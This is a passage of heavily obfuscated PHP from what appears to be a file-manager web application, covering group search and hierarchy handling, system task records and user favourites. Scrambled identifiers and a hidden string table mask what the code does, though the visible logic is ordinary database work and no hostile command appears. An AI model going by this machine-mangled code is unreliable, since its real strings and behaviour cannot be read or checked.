array($”¼•·àï[446] => count($Ûş¯ÖÚÆ[$”¼•·àï[448]]), $”¼•·àï[442] => 20, $”¼•·àï[431] => 1, $”¼•·àï[447] => 1); return $Ûş¯ÖÚÆ; } public function listSearchNow($´şÜ˜€¹) { $¤ÄøšÈ =& $_SERVER[ÅÄÇĞô]; $îé˜şÙ = trim($´şÜ˜€¹[$¤ÄøšÈ[2096]]); $’øˆ•ê¹ = isset($´şÜ˜€¹[$¤ÄøšÈ[2097]]) ? $´şÜ˜€¹[$¤ÄøšÈ[2097]] : !1; if (!trim($îé˜şÙ)) { return !1; } $îé˜şÙ = str_replace($¤ÄøšÈ[2098], $¤ÄøšÈ[2099], $îé˜şÙ); $¨šğ×Ï‰ = array($¤ÄøšÈ[1998] => array($¤ÄøšÈ[462], "{$îé˜şÙ}\x25"), $¤ÄøšÈ[32] => array($¤ÄøšÈ[462], "\45{$îé˜şÙ}\45"), $¤ÄøšÈ[1100] => $¤ÄøšÈ[2100]); if ($’øˆ•ê¹) { $ôÆ·ÓÈæ = $this->getInfoSimple($’øˆ•ê¹); $×íĞ´ğ† = $ôÆ·ÓÈæ[$¤ÄøšÈ[589]] . $’øˆ•ê¹ . $¤ÄøšÈ[621]; $¨šğ×Ï‰ = array($¨šğ×Ï‰, array($¤ÄøšÈ[589] => array($¤ÄøšÈ[462], $×íĞ´ğ†))); } $¨šğ×Ï‰ = $this->parseWhereLike($¨šğ×Ï‰); $Äï—äí… = $this->_makeOrder()->where($¨šğ×Ï‰)->selectPage(20); $Äï—äí… = $Äï—äí… ? $Äï—äí… : array($¤ÄøšÈ[448] => array(), $¤ÄøšÈ[445] => array()); if (!$Äï—äí… || count($Äï—äí…[$¤ÄøšÈ[448]]) < 5 && Input::check($îé˜şÙ, $¤ÄøšÈ[396])) { $ûÁß’úğ = $this->groupChildrenAll($’øˆ•ê¹); $µ¨ìèÁä = $this->_searchFromMeta($¤ÄøšÈ[540], $îé˜şÙ, 10, $ûÁß’úğ); $–³ÄòÕç = $this->_searchFromMeta($¤ÄøšÈ[541], $îé˜şÙ, 10, $ûÁß’úğ); $áÁÀ¡â = array_merge($µ¨ìèÁä, $–³ÄòÕç, $Äï—äí…[$¤ÄøšÈ[448]]); $Äï—äí…[$¤ÄøšÈ[448]] = array_unique_by_key($áÁÀ¡â, $¤ÄøšÈ[1998]); $Äï—äí…[$¤ÄøšÈ[445]][$¤ÄøšÈ[446]] = count($Äï—äí…[$¤ÄøšÈ[448]]); $Äï—äí…[$¤ÄøšÈ[445]][$¤ÄøšÈ[447]] = ceil($Äï—äí…[$¤ÄøšÈ[445]][$¤ÄøšÈ[446]] / $Äï—äí…[$¤ÄøšÈ[445]][$¤ÄøšÈ[442]]); } $this->_listDataApply($Äï—äí…[$¤ÄøšÈ[448]]); return $Äï—äí…; } protected function groupChildrenAll($–ÇŠÉæä) { $‰Ã®„ºÅ =& $_SERVER[ÅÄÇĞô]; if (!$–ÇŠÉæä) { return !1; } if (!is_array($–ÇŠÉæä)) { $–ÇŠÉæä = array($–ÇŠÉæä); } $ÉÀäãÄ = $–ÇŠÉæä; foreach ($–ÇŠÉæä as $ú©­š‚‹) { $‚ïŠõ¡« = $this->getInfoSimple($ú©­š‚‹); $üÓØóï = array($‰Ã®„ºÅ[589] => array($‰Ã®„ºÅ[462], $‚ïŠõ¡«[$‰Ã®„ºÅ[589]] . $ú©­š‚‹ . $‰Ã®„ºÅ[621])); $´¦ÄõµŠ = $this->field($‰Ã®„ºÅ[1998])->where($üÓØóï)->select(); $ÉÀäãÄ = array_merge($ÉÀäãÄ, array_to_keyvalue($´¦ÄõµŠ, $‰Ã®„ºÅ[12], $‰Ã®„ºÅ[1998])); } return array_unique($ÉÀäãÄ); } private function _searchFromMeta($ï·í±®ô, $å„¸³¹, $ºÆˆ°™û, $¯ºŠœˆä) { $¢ô©ß¼ =& $_SERVER[ÅÄÇĞô]; $å„¸³¹ = strtolower($å„¸³¹); $ºñíÚÇ = array($¢ô©ß¼[97] => $ï·í±®ô, $¢ô©ß¼[453] => array($¢ô©ß¼[462], "\45{$å„¸³¹}\x25")); $ºñíÚÇ = $this->parseWhereLike($ºñíÚÇ); if ($¯ºŠœˆä) { $ºñíÚÇ[$¢ô©ß¼[1998]] = array($¢ô©ß¼[7], $¯ºŠœˆä); } $¤ÄÖ“ = Model($¢ô©ß¼[2101])->where($ºñíÚÇ)->limit($ºÆˆ°™û)->select(); if (!$¤ÄÖ“) { return array(); } $¤ÄÖ“ = array_to_keyvalue($¤ÄÖ“, $¢ô©ß¼[12], $¢ô©ß¼[1998]); $˜ÂîÀ = $this->where(array($¢ô©ß¼[2090] => array($¢ô©ß¼[7], $¤ÄÖ“)))->select(); if (!$˜ÂîÀ) { return array(); } return $˜ÂîÀ; } protected function _listDataApplyItem($ò˜¾¸Óî) { $¥ö³™Óª = array($ò˜¾¸Óî); $this->_listDataApply($¥ö³™Óª); return $¥ö³™Óª[0]; } protected function _listDataApply(&$±œÄ™ıÚ) { $ÌÎÊâ¨² =& $_SERVER[ÅÄÇĞô]; if (!$±œÄ™ıÚ) { return; } $’á¼›¿” = array_to_keyvalue($±œÄ™ıÚ, $ÌÎÊâ¨²[12], $ÌÎÊâ¨²[1998]); $this->_listAppendChildren($±œÄ™ıÚ); $this->_listAppendChildrenMember($±œÄ™ıÚ); $this->_listAppendMeta($±œÄ™ıÚ, $’á¼›¿”); $this->_listAppendParent($±œÄ™ıÚ); $this->_listAppendSourceRoot($±œÄ™ıÚ, $’á¼›¿”); } private function _listAppendChildren(&$±ğÊÖô) { $Íè¾úÆ£ =& $_SERVER[ÅÄÇĞô]; $ò¼‘˜¦˜ = array_to_keyvalue($±ğÊÖô, $Íè¾úÆ£[12], $Íè¾úÆ£[1998]); $±Ïİòğ = array($Íè¾úÆ£[193] => array($Íè¾úÆ£[7], $ò¼‘˜¦˜)); $ÈªÄÊö¿ = array($Íè¾úÆ£[193], $Íè¾úÆ£[2102] => $Íè¾úÆ£[570]); $ùüï Š = $this->field($ÈªÄÊö¿)->where($±Ïİòğ)->group($Íè¾úÆ£[193])->select(); $õ™â¯šÂ = array_to_keyvalue($ùüï Š, $Íè¾úÆ£[193], $Íè¾úÆ£[570]); foreach ($±ğÊÖô as &$ŸÚï¹Üˆ) { $°È£¼ô = $ŸÚï¹Üˆ[$Íè¾úÆ£[1998]]; $ŸÚï¹Üˆ[$Íè¾úÆ£[2103]] = isset($õ™â¯šÂ[$°È£¼ô]) ? intval($õ™â¯šÂ[$°È£¼ô]) : !1; } unset($ŸÚï¹Üˆ); } private function _listAppendChildrenMember(&$Êº»¡ğÍ) { $’ËÖÈû³ =& $_SERVER[ÅÄÇĞô]; $áî÷ğ = array_to_keyvalue($Êº»¡ğÍ, $’ËÖÈû³[12], $’ËÖÈû³[1998]); $ÚÆ†¼‰˜ = array($’ËÖÈû³[1998] => array($’ËÖÈû³[7], $áî÷ğ)); $úÇ³â¤˜ = array($’ËÖÈû³[1998], $’ËÖÈû³[2102] => $’ËÖÈû³[570]); $ñö°îŞê = Model($’ËÖÈû³[2092])->field($úÇ³â¤˜)->where($ÚÆ†¼‰˜)->group($’ËÖÈû³[1998])->select(); $À»Êª–¤ = array_to_keyvalue($ñö°îŞê, $’ËÖÈû³[1998], $’ËÖÈû³[570]); foreach ($Êº»¡ğÍ as &$—¦Ë®•’) { $ßø»‰Ÿ = $—¦Ë®•’[$’ËÖÈû³[1998]]; $—¦Ë®•’[$’ËÖÈû³[2104]] = isset($À»Êª–¤[$ßø»‰Ÿ]) ? intval($À»Êª–¤[$ßø»‰Ÿ]) : !1; } unset($—¦Ë®•’); } private function _listAppendMeta(&$ø¬÷ƒ­î, $ÔÌéğğ) { $¬ù¦±Å™ =& $_SERVER[ÅÄÇĞô]; $ÌñƒŞ = array($¬ù¦±Å™[1998] => array($¬ù¦±Å™[7], $ÔÌéğğ)); $ïİÖ¬•ş = Model($¬ù¦±Å™[2091])->where($ÌñƒŞ)->select(); $ïİÖ¬•ş = array_to_keyvalue_group($ïİÖ¬•ş, $¬ù¦±Å™[1998]); foreach ($ïİÖ¬•ş as &$ ç¬Û²Ğ) { $ ç¬Û²Ğ = array_to_keyvalue($ ç¬Û²Ğ, $¬ù¦±Å™[97], $¬ù¦±Å™[453]); } unset($ ç¬Û²Ğ); foreach ($ø¬÷ƒ­î as &$æ¹Ó€½É) { $æ¹Ó€½É[$¬ù¦±Å™[544]] = array(); if (isset($ïİÖ¬•ş[$æ¹Ó€½É[$¬ù¦±Å™[1998]]])) { $æ¹Ó€½É[$¬ù¦±Å™[544]] = $ïİÖ¬•ş[$æ¹Ó€½É[$¬ù¦±Å™[1998]]]; } } unset($æ¹Ó€½É); } protected function parentLevelArray($ú·šÚéü) { $¢ °¬Ñİ =& $_SERVER[ÅÄÇĞô]; $ú·šÚéü = explode($¢ °¬Ñİ[50], trim($ú·šÚéü, $¢ °¬Ñİ[50])); $ú·šÚéü = array_remove_value($ú·šÚéü, $¢ °¬Ñİ[231]); return $ú·šÚéü; } protected function parentInGroup($ô—‘û¡, $‚¬¶èÄ÷) { $èôìÕÉ =& $_SERVER[ÅÄÇĞô]; $É¶Úü±¼ = $this->getInfoSimple($ô—‘û¡); if (!$É¶Úü±¼) { return !0; } $Ÿ·İñış = $this->parentLevelArray($É¶Úü±¼[$èôìÕÉ[589]]); $Ÿ·İñış[] = $ô—‘û¡; foreach ($Ÿ·İñış as $ô—‘û¡) { if (in_array($ô—‘û¡ . $èôìÕÉ[12], $‚¬¶èÄ÷)) { return !0; } } return !1; } private function _listAppendParent(&$€µÃöšÔ) { $„ç¢Í =& $_SERVER[ÅÄÇĞô]; $áÈ¬“éÁ = array(); foreach ($€µÃöšÔ as &$„ŠÑó¸£) { $áÈ¬“éÁ[$„ŠÑó¸£[$„ç¢Í[1998]]] = $„ŠÑó¸£[$„ç¢Í[32]]; $œ¦ôÚ‰³ = $this->parentLevelArray($„ŠÑó¸£[$„ç¢Í[589]]); foreach ($œ¦ôÚ‰³ as $İºü¡£œ) { if (!isset($áÈ¬“éÁ[$İºü¡£œ])) { $áÈ¬“éÁ[$İºü¡£œ] = 0; } } } unset($„ŠÑó¸£); foreach ($áÈ¬“éÁ as $ıÇÚç‹â => $×¡åûÛˆ) { if ($×¡åûÛˆ) { continue; } $Éº¦ Åì = $this->getInfoSimple($ıÇÚç‹â); $áÈ¬“éÁ[$ıÇÚç‹â] = $Éº¦ Åì[$„ç¢Í[32]]; } $­ª­ı¨‰ = $GLOBALS[$„ç¢Í[6]][$„ç¢Í[92]][$„ç¢Í[2105]]; if (KodUser::isRoot()) { $­ª­ı¨‰ = !1; } foreach ($€µÃöšÔ as &$„ŠÑó¸£) { $œ¦ôÚ‰³ = $this->parentLevelArray($„ŠÑó¸£[$„ç¢Í[589]]); $³¬¯çù· = $„ç¢Í[12]; foreach ($œ¦ôÚ‰³ as $ıÇÚç‹â => $İºü¡£œ) { if ($­ª­ı¨‰ && $ıÇÚç‹â == 0) { continue; } $³¬¯çù· .= $áÈ¬“éÁ[$İºü¡£œ] . $„ç¢Í[8]; } if ($œ¦ôÚ‰³) { $³¬¯çù· .= $„ŠÑó¸£[$„ç¢Í[32]]; } $„ŠÑó¸£[$„ç¢Í[594]] = str_replace($„ç¢Í[257], $„ç¢Í[8], $³¬¯çù·); } unset($„ŠÑó¸£); } private function _listAppendSourceRoot(&$çÖì¨ÍÁ, $ àöÖÔ¦) { $õª¯°¥ß =& $_SERVER[ÅÄÇĞô]; $’±¿ –ú = Model($õª¯°¥ß[925])->listSourceRoot(SourceModel::TYPE_GROUP, $ àöÖÔ¦); $’±¿ –ú = array_to_keyvalue($’±¿ –ú, $õª¯°¥ß[574]); $’±¿ –ú = array_remove_key($’±¿ –ú, $õª¯°¥ß[574]); foreach ($çÖì¨ÍÁ as &$ƒæÚ÷ñ¹) { $ƒæÚ÷ñ¹[$õª¯°¥ß[90]] = $’±¿ –ú[$ƒæÚ÷ñ¹[$õª¯°¥ß[1998]]] ? $’±¿ –ú[$ƒæÚ÷ñ¹[$õª¯°¥ß[1998]]] : array(); } unset($ƒæÚ÷ñ¹); } protected function groupMerge($ìªÌÛÒ“) { $ìªÌÛÒ“ = array_values(array_unique($ìªÌÛÒ“)); $À¸ıĞò = array(); for ($ûš“Ş² = 0; $ûš“Ş² < count($ìªÌÛÒ“); $ûš“Ş²++) { $şıË¡‚Ñ = !1; for ($³šŞŸºÆ = 0; $³šŞŸºÆ < count($ìªÌÛÒ“); $³šŞŸºÆ++) { if ($ûš“Ş² == $³šŞŸºÆ) { continue; } if ($this->isParentOf($ìªÌÛÒ“[$³šŞŸºÆ], $ìªÌÛÒ“[$ûš“Ş²])) { $şıË¡‚Ñ = !0; break; } } if (!$şıË¡‚Ñ) { $À¸ıĞò[] = $ìªÌÛÒ“[$ûš“Ş²]; } } return $À¸ıĞò; } protected function isParentOf($¾Ñ™ü£‘, $”„¬ş) { $ÇÈíï„Ç =& $_SERVER[ÅÄÇĞô]; if (!$¾Ñ™ü£‘ || !$”„¬ş || $¾Ñ™ü£‘ == $”„¬ş) { return !1; } $†Şƒö÷º = $this->getInfoSimple($¾Ñ™ü£‘); $şŸ« € = $this->getInfoSimple($”„¬ş); $ùšƒ¿ùÃ = $†Şƒö÷º[$ÇÈíï„Ç[589]] . $¾Ñ™ü£‘ . $ÇÈíï„Ç[50]; if (substr($şŸ« €[$ÇÈíï„Ç[589]], 0, strlen($ùšƒ¿ùÃ)) == $ùšƒ¿ùÃ) { return !0; } return !1; } public function groupShowRoot($áª¢î­ä, $¼æÎ§ò÷ = false) { $Ï¦¯öƒ =& $_SERVER[ÅÄÇĞô]; $¢¢‡ºä = $this->getInfo($áª¢î­ä); if (!$¢¢‡ºä) { return array(); } $êå£äï¹ = $this->parentLevelArray($¢¢‡ºä[$Ï¦¯öƒ[589]]); $ñ›ğ… = array($áª¢î­ä); if (count($êå£äï¹) == 0) { return $ñ›ğ…; } if ($¼æÎ§ò÷ && count($êå£äï¹) == 1) { return $ñ›ğ…; } if (!$¢¢‡ºä[$Ï¦¯öƒ[544]] || !isset($¢¢‡ºä[$Ï¦¯öƒ[544]][$Ï¦¯öƒ[2088]]) || $¢¢‡ºä[$Ï¦¯öƒ[544]][$Ï¦¯öƒ[2088]] == $Ï¦¯öƒ[871]) { return $this->groupShowRoot($êå£äï¹[count($êå£äï¹) - 1], $¼æÎ§ò÷); } if ($¢¢‡ºä[$Ï¦¯öƒ[544]][$Ï¦¯öƒ[2088]] == $Ï¦¯öƒ[435]) { $±èóæ = explode($Ï¦¯öƒ[50], $¢¢‡ºä[$Ï¦¯öƒ[544]][$Ï¦¯öƒ[2089]]); if ($±èóæ) { $ñ›ğ… = array_merge($ñ›ğ…, $±èóæ); } } return $ñ›ğ…; } protected function resetParentLevel() { $»Ù¼®ùé =& $_SERVER[ÅÄÇĞô]; $‚òƒ°¥Ğ = $»Ù¼®ùé[1998]; $†ášò‚‹ = $this->select(); $†ášò‚‹ = array_to_keyvalue($†ášò‚‹, $‚òƒ°¥Ğ); foreach ($†ášò‚‹ as $™Æ¹¡) { $—Õ÷¢èô = $™Æ¹¡; $•ñ¾Ï·à = array(); while ($—Õ÷¢èô[$»Ù¼®ùé[193]] != 0) { $•ñ¾Ï·à[] = $—Õ÷¢èô[$»Ù¼®ùé[193]]; $—Õ÷¢èô = $†ášò‚‹[$—Õ÷¢èô[$»Ù¼®ùé[193]]]; } $•ñ¾Ï·à[] = 0; $•ñ¾Ï·à = $»Ù¼®ùé[50] . implode($»Ù¼®ùé[50], array_reverse($•ñ¾Ï·à)) . $»Ù¼®ùé[50]; $this->setNamePinyin($™Æ¹¡[$‚òƒ°¥Ğ], $™Æ¹¡[$»Ù¼®ùé[32]]); $this->where(array($‚òƒ°¥Ğ => $™Æ¹¡[$‚òƒ°¥Ğ]))->save(array($»Ù¼®ùé[660] => $•ñ¾Ï·à)); } return $†ášò‚‹; } public function groupNameAuto($é”è•úÄ, $”¥êí¾Ñ) { $ÖËã¸üœ =& $_SERVER[ÅÄÇĞô]; $­‡ĞÚ÷ø = $this->where(array($ÖËã¸üœ[480] => $é”è•úÄ))->getField($ÖËã¸üœ[32], !0); if (!$­‡ĞÚ÷ø || !in_array($”¥êí¾Ñ, $­‡ĞÚ÷ø)) { return $”¥êí¾Ñ; } for ($ÈÇàÇØ• = 1; $ÈÇàÇØ• <= count($­‡ĞÚ÷ø) + 1; $ÈÇàÇØ•++) { $˜ìåòİ¡ = $”¥êí¾Ñ . "\x28{$ÈÇàÇØ•}\51"; if (!in_array($˜ìåòİ¡, $­‡ĞÚ÷ø)) { return $˜ìåòİ¡; } } } public function groupSwitch($Ï¶˜ˆ«ˆ, $İİìûó) { $•ûü†å™ =& $_SERVER[ÅÄÇĞô]; $È£¢÷äã = array($•ûü†å™[1998] => array($•ûü†å™[7], array($Ï¶˜ˆ«ˆ, $İİìûó))); $”êøÀ…— = $this->where($È£¢÷äã)->select(); $”êøÀ…— = array_to_keyvalue($”êøÀ…—, $•ûü†å™[1998]); if (!isset($”êøÀ…—[$Ï¶˜ˆ«ˆ]) || !isset($”êøÀ…—[$İİìûó]) || $”êøÀ…—[$Ï¶˜ˆ«ˆ][$•ûü†å™[193]] == 0) { return !1; } $È£¢÷äã = array($•ûü†å™[1998] => $Ï¶˜ˆ«ˆ); $úøô»ùÜ = Model($•ûü†å™[2092])->where($È£¢÷äã)->select(); if (!$úøô»ùÜ) { $úøô»ùÜ = array(); } foreach ($úøô»ùÜ as $¦™†²é¶) { $·ÖËÀ‚Î = $¦™†²é¶[$•ûü†å™[1797]]; $È£¢÷äã = array($•ûü†å™[1797] => $·ÖËÀ‚Î, $•ûü†å™[1998] => $İİìûó); $ñÑ•ÖîÃ = Model($•ûü†å™[2092])->where($È£¢÷äã)->find(); if (!$ñÑ•ÖîÃ) { $—¢°óäÅ = array($İİìûó => $¦™†²é¶[$•ûü†å™[2106]]); Model($•ûü†å™[602])->userGroupAdd($·ÖËÀ‚Î, $—¢°óäÅ); } Model($•ûü†å™[602])->userGroupRemove($·ÖËÀ‚Î, $Ï¶˜ˆ«ˆ); } $È£¢÷äã = array($•ûü†å™[191] => 2, $•ûü†å™[193] => 0, $•ûü†å™[488] => 1, $•ûü†å™[574] => array($•ûü†å™[7], array($Ï¶˜ˆ«ˆ, $İİìûó))); $±¸ÜÙÖç = Model($•ûü†å™[925])->where($È£¢÷äã)->field($•ûü†å™[2107])->select(); $±¸ÜÙÖç = array_to_keyvalue($±¸ÜÙÖç, $•ûü†å™[574], $•ûü†å™[194]); $ä§Öü‡Ñ = !empty($±¸ÜÙÖç[$Ï¶˜ˆ«ˆ]) ? $±¸ÜÙÖç[$Ï¶˜ˆ«ˆ] : !1; if ($ä§Öü‡Ñ) { if (!$±¸ÜÙÖç[$İİìûó]) { $±¸ÜÙÖç[$İİìûó] = Model($•ûü†å™[925])->groupRootAdd($İİìûó); } $ÉÏç´Ì = $±¸ÜÙÖç[$İİìûó]; $È£¢÷äã = array($•ûü†å™[193] => $ä§Öü‡Ñ); $±¸ÜÙÖç = Model($•ûü†å™[925])->where($È£¢÷äã)->field($•ûü†å™[2108])->select(); if (!$±¸ÜÙÖç) { $±¸ÜÙÖç = array(); } Model($•ûü†å™[925])->moveClearAuth = !1; foreach ($±¸ÜÙÖç as $¾ıê×È®) { $£¢ß¬¨‡ = $¾ıê×È®[$•ûü†å™[488]] == $•ûü†å™[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($•ûü†å™[925])->move($¾ıê×È®[$•ûü†å™[194]], $ÉÏç´Ì, $£¢ß¬¨‡); } Model($•ûü†å™[925])->moveClearAuth = !0; $È£¢÷äã = array($•ûü†å™[191] => 2, $•ûü†å™[574] => $Ï¶˜ˆ«ˆ); $ˆÕ¼éĞé = array($•ûü†å™[574] => $İİìûó); Model($•ûü†å™[2109])->where($È£¢÷äã)->save($ˆÕ¼éĞé); Model($•ûü†å™[2110])->where($È£¢÷äã)->save($ˆÕ¼éĞé); } $this->_changeChildLevel($”êøÀ…—[$Ï¶˜ˆ«ˆ], $”êøÀ…—[$İİìûó], !0); $this->where(array($•ûü†å™[193] => $Ï¶˜ˆ«ˆ))->save(array($•ûü†å™[193] => $İİìûó)); $this->_clearChildrenCache($”êøÀ…—[$İİìûó]); return !0; } } goto aÔÄëøòÕğ; dœí¯ÌëÛ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\164\141\163\153\114\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\x74\171\x70\x65", "\x65\x76\x65\156\x74", "\x74\x69\155\145", "\x64\x65\x73\x63", "\x73\x79\163\x74\x65\155", "\145\x6e\x61\x62\x6c\x65", "\x6c\141\x73\x74\122\165\156", "\163\x6f\x72\164"); public function listData($’Ç”Œ×ª = false, $Çâ·…Ã´ = "\163\157\162\x74", $¬©¶Å¤Ø = false) { return parent::listData($’Ç”Œ×ª, $Çâ·…Ã´, $¬©¶Å¤Ø); } public function add($ØÉ›Ù…—) { $şêğ¤Çã =& $_SERVER[ÅÄÇĞô]; $°÷”ö¥ = $this->findByName($ØÉ›Ù…—[$şêğ¤Çã[32]]); if ($°÷”ö¥) { return !1; } $ØÉ›Ù…—[$şêğ¤Çã[1747]] = 0; $ØÉ›Ù…—[$şêğ¤Çã[2022]] = $this->getSort(); return parent::insert($ØÉ›Ù…—); } private function getSort() { $Ü ÔÜğŒ =& $_SERVER[ÅÄÇĞô]; $ê’ÊÅÂƒ = parent::listData(); $ÆÀê×Ãµ = array_to_keyvalue($ê’ÊÅÂƒ, $Ü ÔÜğŒ[12], $Ü ÔÜğŒ[2022]); return empty($ÆÀê×Ãµ) ? 0 : max($ÆÀê×Ãµ) + 1; } public function update($ÂÑÁş“·, $ó¿…×àó) { $–¬³ÃÁ =& $_SERVER[ÅÄÇĞô]; $¨¿¦‹Îñ = $this->listData($ÂÑÁş“·); $êŞáÜØ’ = $this->findByName($ó¿…×àó[$–¬³ÃÁ[32]]); if (!$¨¿¦‹Îñ || $êŞáÜØ’ && $êŞáÜØ’[$–¬³ÃÁ[478]] != $¨¿¦‹Îñ[$–¬³ÃÁ[478]]) { return !1; } return parent::update($ÂÑÁş“·, $ó¿…×àó); } public function remove($ÉØ³ÄŠ¢, $¶á‚õå = false) { $°İœØÄÙ =& $_SERVER[ÅÄÇĞô]; $ü‘™ÎÎ÷ = $this->listData($ÉØ³ÄŠ¢); if (!$ü‘™ÎÎ÷) { return; } if (!$¶á‚õå && $ü‘™ÎÎ÷[$°İœØÄÙ[192]] == $°İœØÄÙ[91]) { return !1; } return parent::remove($ÉØ³ÄŠ¢); } public function enable($’ùÊãªü, $ÓıÍâ®¼) { return $this->update($’ùÊãªü, array($_SERVER[ÅÄÇĞô][2475] => $ÓıÍâ®¼)); } public function run($Õ¤‚«™) { return $this->update($Õ¤‚«™, array($_SERVER[ÅÄÇĞô][2487] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($›¢®œÅ¥) { $¶¹»°× =& $_SERVER[ÅÄÇĞô]; return array($¶¹»°×[2113] => array(USER_ID, $¶¹»°×[2488])); } protected function listData() { $µÁ·±†Õ =& $_SERVER[ÅÄÇĞô]; $¸³×¹èÏ = array($µÁ·±†Õ[1788] => USER_ID, $µÁ·±†Õ[562] => 0); $ù÷ì¶Î = $µÁ·±†Õ[2489]; $ç¸´İ  = $this->field($ù÷ì¶Î)->where($¸³×¹èÏ)->order($µÁ·±†Õ[2490])->select(); return $ç¸´İ  ? $ç¸´İ  : array(); } protected function resetCache() { } protected function listView() { $‘ÒŠô° =& $_SERVER[ÅÄÇĞô]; $ñÓ°¼ğ  = $this->listData(); $èÈ×Ó…ä = array_filter_by_field($ñÓ°¼ğ , $‘ÒŠô°[33], $‘ÒŠô°[493]); $¨‹üÆ® = array_to_keyvalue($èÈ×Ó…ä, $‘ÒŠô°[12], $‘ÒŠô°[87]); if (!$¨‹üÆ®) { return $ñÓ°¼ğ ; } $éÙ¬ë´ = 2000; $ğ‚ù·ïÖ = array($‘ÒŠô°[494] => array($‘ÒŠô°[495], $¨‹üÆ®)); $½‡ıÒ©” = Model($‘ÒŠô°[925])->listSource($ğ‚ù·ïÖ, $éÙ¬ë´); $½‡ıÒ©” = array_merge($½‡ıÒ©”[$‘ÒŠô°[86]], $½‡ıÒ©”[$‘ÒŠô°[85]]); $½‡ıÒ©” = array_to_keyvalue($½‡ıÒ©”, $‘ÒŠô°[194]); foreach ($ñÓ°¼ğ  as $ª½½Œçã => $’’ÌÒ‰ñ) { $£ÇÎ†÷¿ = $½‡ıÒ©”[$’’ÌÒ‰ñ[$‘ÒŠô°[87]]]; $£ÇÎ†÷¿ = $£ÇÎ†÷¿ ? $£ÇÎ†÷¿ : array(); $ñÓ°¼ğ [$ª½½Œçã] = array_merge($£ÇÎ†÷¿, $’’ÌÒ‰ñ); } return $ñÓ°¼ğ ; } protected function addFav($ÈõŒ¹í¨, $Ï‘Õ“âĞ = '', $÷Šæ×àñ = "\163\157\165\162\143\145") { $Ò½‹íû¡ =& $_SERVER[ÅÄÇĞô]; $øùÓÒ†§ = array($Ò½‹íû¡[1788] => USER_ID, $Ò½‹íû¡[562] => 0, $Ò½‹íû¡[499] => $÷Šæ×àñ, $Ò½‹íû¡[498] => $ÈõŒ¹í¨); if ($this->where($øùÓÒ†§)->find()) { return !1; } $øùÓÒ†§ = array($Ò½‹íû¡[1788] => USER_ID, $Ò½‹íû¡[562] => 0); $ÅÆ£•’å = $this->where($øùÓÒ†§)->max($Ò½‹íû¡[2022]); if (!$ÅÆ£•’å) { $ÅÆ£•’å = 0; } if (!$Ï‘Õ“âĞ && $÷Šæ×àñ == $Ò½‹íû¡[493]) { $„õ—è¥ = Model($Ò½‹íû¡[1444])->where(array($Ò½‹íû¡[494] => $ÈõŒ¹í¨))->find(); if (!$„õ—è¥) { return !1; } $Ï‘Õ“âĞ = $„õ—è¥[$Ò½‹íû¡[32]]; } $Ï‘Õ“âĞ = $this->getAutoName($Ï‘Õ“âĞ); $ïãŞ€§ = array($Ò½‹íû¡[1788] => USER_ID, $Ò½‹íû¡[562] => 0, $Ò½‹íû¡[497] => $Ï‘Õ“âĞ, $Ò½‹íû¡[498] => $ÈõŒ¹í¨, $Ò½‹íû¡[499] => $÷Šæ×àñ, $Ò½‹íû¡[2002] => $ÅÆ£•’å + 1); return $this->add($ïãŞ€§); } protected function remove($Èô±¥úâ) { $å™«»™Â =& $_SERVER[ÅÄÇĞô]; $òÛô˜ı = array($å™«»™Â[1788] => USER_ID, $å™«»™Â[496] => $Èô±¥úâ); return $this->where($òÛô˜ı)->delete(); } protected function removeByName($ùÛÑœè‘) { $û€Á¹èû =& $_SERVER[ÅÄÇĞô]; $ßĞûŠ¸ú = array($û€Á¹èû[1788] => USER_ID, $û€Á¹èû[497] => $ùÛÑœè‘, $û€Á¹èû[562] => 0); return $this->where($ßĞûŠ¸ú)->delete(); } protected function rename($³‚¼Œ®ô, $à®Ìò™È) { $øÉâŞß× =& $_SERVER[ÅÄÇĞô]; if ($³‚¼Œ®ô == $à®Ìò™È) { return !1; } $å·‡¼á™ = $this->getAutoName($à®Ìò™È); if ($à®Ìò™È != $å·‡¼á™) { return !1; } $„ò´ß®È = array($øÉâŞß×[1788] => USER_ID, $øÉâŞß×[562] => 0, $øÉâŞß×[32] => $³‚¼Œ®ô); return $this->where($„ò´ß®È)->save(array($øÉâŞß×[32] => $à®Ìò™È)); } protected function resetSort($Çûò€) { $²×­…ë =& $_SERVER[ÅÄÇĞô]; $Çûò€ = is_array($Çûò€) ? $Çûò€ : array(); $¨ò¿áùë = array($²×­…ë[1788] => USER_ID); for ($·­Íè­Æ = 0; $·­Íè­Æ < count($Çûò€); $·­Íè­Æ++) { $¨ò¿áùë[$²×­…ë[496]] = $Çûò€[$·­Íè­Æ]; $this->where($¨ò¿áùë)->save(array($²×­…ë[2002] => $·­Íè­Æ + 1)); } return !0; } protected function moveTop($¥’”»¤ë) { $çÆäˆë§ =& $_SERVER[ÅÄÇĞô]; $ÀÜ‚Å·‡ = array($çÆäˆë§[1788] => USER_ID, $çÆäˆë§[562] => 0); $òÌ÷Å = $this->where($ÀÜ‚Å·‡)->where(array($çÆäˆë§[32] => $¥’”»¤ë))->find(); if (!$òÌ÷Å) { return; } $ÒËùÔ÷ = $this->field($çÆäˆë§[478])->where($ÀÜ‚Å·‡)->order($çÆäˆë§[2490])->select(); $ÒËùÔ÷ = array_to_keyvalue($ÒËùÔ÷, $çÆäˆë§[12], $çÆäˆë§[478]); $ŸÎî«‘È = $ÒËùÔ÷; $ÒËùÔ÷ = array_remove_value($ÒËùÔ÷, $òÌ÷Å[$çÆäˆë§[478]]); array_unshift($ÒËùÔ÷, $òÌ÷Å[$çÆäˆë§[478]]); return $this->resetSort($ÒËùÔ÷); } protected function moveBottom($³Øò©) { $Ñœ®áÖ =& $_SERVER[ÅÄÇĞô]; $Ãı“Âß = array($Ñœ®áÖ[1788] => USER_ID, $Ñœ®áÖ[562] => 0); $Ö››ö­” = $this->where($Ãı“Âß)->max($Ñœ®áÖ[2022]); $ØÊáİçÑ = array($Ñœ®áÖ[2022] => $Ö››ö­” + 1); return $this->where($Ãı“Âß)->where(array($Ñœ®áÖ[32] => $³Øò©))->save($ØÊáİçÑ); } private function getAutoName($¢ÍÉõÂø) { $¢Âğ¦Ëà =& $_SERVER[ÅÄÇĞô]; $ºÙ«Á› = array($¢Âğ¦Ëà[1788] => USER_ID, $¢Âğ¦Ëà[562] => 0); $ò é¸å† = 